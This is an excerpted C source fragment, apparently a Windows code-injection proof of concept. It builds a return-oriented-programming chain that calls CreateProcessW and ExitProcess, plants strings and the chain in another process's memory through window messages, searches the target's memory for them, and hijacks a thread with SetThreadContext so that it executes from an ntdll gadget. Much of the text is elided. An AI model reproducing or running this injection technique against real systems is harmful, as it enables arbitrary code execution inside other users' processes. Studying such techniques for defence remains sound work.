...
void GenerateSimpleTestROP() {
  ...
  *(ULONG_PTR*)&MYLOL[0 * sizeof(ULONG_PTR)] =
      (ULONG_PTR)pcreateproc;  //  pop eax = addr of CreateProcessW (later jmp rax)
  *(ULONG_PTR*)&MYLOL[1 * sizeof(ULONG_PTR)] = 0;  //  pop edx = lpCommandLine = NULL
  *(ULONG_PTR*)&MYLOL[2 * sizeof(ULONG_PTR)] = ginjectedPathaddr;  //  pop ecx = lpFile =
                                                                   //  injectedPath
  ...
  *(ULONG_PTR*)&MYLOL[7 * sizeof(ULONG_PTR)] =
      pexitproc;  //  stack1 = retaddr = ExitProcess (restart target)
#else
...
int search2(char* text, unsigned int n, char* pat, unsigned int m) {
  unsigned int i = 0;
  for (i = 0; i + m < n; i++) {
    if (!memcmp(&text[i], pat, m)) return i;
  }
  return -1;
}
...
unsigned int SearchProcessMemForPattern(char* procnamepattern,
                                        char* searchitem,
                                        unsigned int searchitemlen,
                                        ULONG_PTR* outmatches,
                                        unsigned int maxoutmatches,
                                        DWORD* outpid) {
...
VOID SecondStage() {
  ...
  BOOL bgood = FALSE;
  DoInjectPath();
  nmatchespaths = SearchProcessMemForPattern(
      TARGETPROC, INJPATHW, sizeof(INJPATHW) - 2, outmatchespaths, 100, &pid);
  for (i = 0; i < nmatchespaths; i++) {
    ...
    Sleep(3000);  //  sleep a time to recheck the strings in the target process (to be a bit more
                  //  sure they are not temporary trash)
    ...
    if (hProc) {
      ...
      if (!memcmp(temp, MYLOL, sizeof(MYLOL)) && !memcmp(temp2, INJPATHW, sizeof(INJPATHW) - 2)) {
        bgood = TRUE;
        break;
      }
      CloseHandle(hProc);
  ...
  if (hProc) {
    for (i = nmatches - 1;; i--) {
      ...
      http:                     //  c.Rip = grop1; //ntdll code to start execution
        SetThreadContext(t, &c);
        ResumeThread(t);
        SuspendResumeAllThreads(pid, 0);
        ResumeThread(t);
        SuspendResumeAllThreads(pid, 0);
        ResumeThread(t);
        SuspendResumeAllThreads(pid, 0);
...
void DoInjectPath() { EnumChildWindows(NULL, EnumWindowsProcSetText, 0); }

void DoInjectROP() { EnumChildWindows(NULL, EnumWindowsProcCopyData, 0); }
